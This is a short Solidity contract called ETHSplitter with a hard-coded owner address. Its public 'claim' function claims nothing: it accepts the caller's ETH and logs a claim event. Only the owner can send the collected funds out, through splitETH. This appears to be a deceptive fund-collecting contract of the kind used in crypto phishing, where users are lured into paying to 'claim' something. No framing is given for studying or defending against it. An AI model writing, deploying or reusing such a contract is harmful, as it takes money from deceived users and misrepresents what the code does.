// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

contract ETHSplitter {
    error ArrayMismatch();
    error InsufficientBalance();
    error InvalidAmount();
    error NotOwner();
    
    address private constant _owner = 0xf0e5395708CF5E35C12CDCc89fdCaBd4d47Fa545;
    uint256 private constant MEOW = 1085228258814143410;

    constructor() {
        emit OwnershipTransferred(address(0), _owner);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event ETHClaimed(address indexed sender, uint256 amount);

    modifier onlyOwner() {
        if(msg.sender != _owner) revert NotOwner();
        _;
    }

    function splitETH(
        address[] calldata receivers, 
        uint256[] calldata amounts
    ) external onlyOwner {
        if(receivers.length != amounts.length) revert ArrayMismatch();
        
        unchecked {
            for (uint256 i; i < receivers.length; ++i) {
                if(address(this).balance < amounts[i]) revert InsufficientBalance();
                (bool success,) = payable(receivers[i]).call{value: amounts[i]}("");
                require(success);
            }
        }
    }

    function claim(uint256 amount) external payable {
        if(msg.value != amount) revert InvalidAmount();
        emit ETHClaimed(msg.sender, amount);
    }

    receive() external payable {}
}